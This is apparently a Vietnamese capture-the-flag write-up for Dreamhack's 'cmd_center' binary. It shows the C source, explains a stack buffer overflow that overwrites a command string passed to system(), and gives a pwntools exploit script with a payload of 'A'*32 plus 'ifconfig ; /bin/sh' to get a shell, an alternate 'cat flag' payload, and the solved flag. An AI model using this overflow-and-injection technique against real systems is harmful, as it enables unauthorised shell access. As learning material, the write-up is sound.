# cmd_center

trước khi cùng giải chall này thì ta cần tìm hiểu thêm tại liệu tại đây

**dreamhack:** https://learn.dreamhack.io/1#3

**source C:**

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void init() {
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
}

int main()
{

	char cmd_ip[256] = "ifconfig";
	int dummy;
	char center_name[24];

	init();

	printf("Center name: ");
	read(0, center_name, 100);


	if( !strncmp(cmd_ip, "ifconfig", 8)) {
		system(cmd_ip);
	}

	else {
		printf("Something is wrong!\n");
	}
	exit(0);
}

```

oke ở bài này **có lỗi BOF tại center_name**

ở trong hàm if **có hàm system(cmd_ip)**

**điều kiện của if là so sánh 8byte đầu của cmd_id với ifconfig**

nếu vậy thì ta phải giữ nguyên cmd_ip rồi, nma nếu vậy thì khi chạy vô hàm system thì nó sẽ thành system(ifconfig) và ta sẽ ko thấy được shell đâu

**để giải quyết bài này thì cùng phân tích tài liệu ở trên** 

![image](https://github.com/gookoosss/CTF/assets/128712571/cedceb6c-22ac-4bf0-915f-4f43f57031fb)


ở ví dụ trong tài liệu, ta thấy là nếu ta nhập vào **ping -c 2 127.0.0.1;/bin/sh** giống trong ảnh , thì hàm **system sẽ thực thi ping -c 2 127.0.0.1 trước sau đó sẽ thực thi /bin/sh**

![image](https://github.com/gookoosss/CTF/assets/128712571/355d7dd2-46cd-49c2-9922-3a6bd10bdf8b)



quay lại chall thì ta debug thử 

![image](https://github.com/gookoosss/CTF/assets/128712571/f20a5943-4c62-42f5-9a7c-21a6e4f43027)


**ở đây ta có thể tràn biến xuống và thay đổi cmd_ip**

bây giờ ta sẽ nhập **32byte a + ifconfig;/bin/sh** thì đã lấy được shell rồi

![image](https://github.com/gookoosss/CTF/assets/128712571/003f513e-c25f-46dd-87d8-40fd3da9e02a)


### giải thích:

- khi ta nhập vào **32byte a + ifconfig;/bin/sh** thì giá trị của **cmd_ip lúc này sẽ là ifconfig;/bin/sh** 
- lúc này **system(cmd_ip) sẽ thành system(ifconfig;/bin/sh)**, như phân tích ở trên thì lúc này nó tương đương như  system(ifconfig) và system(/bin/sh) vậy
- có system(/bin/sh) rồi thì ta sẽ dễ dàng lấy được shell

``` c
system(ifconfig;/bin/sh) == system(ifconfig) + system(/bin/sh) 
```

## script:

```python 
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./cmd_center',checksec=False)

#p = process(exe.path)
p = remote('host3.dreamhack.games',23853)

payload = b'A'*32
payload += b'ifconfig ; /bin/sh'
#payload += b'ifconfig | cat flag' // cách 2
p.sendafter(b'Center name: ',payload)

p.interactive()

# DH{f4c11bf9ea5a1df24175ee4d11da0d16}

```

## Flag:

**DH{f4c11bf9ea5a1df24175ee4d11da0d16}**


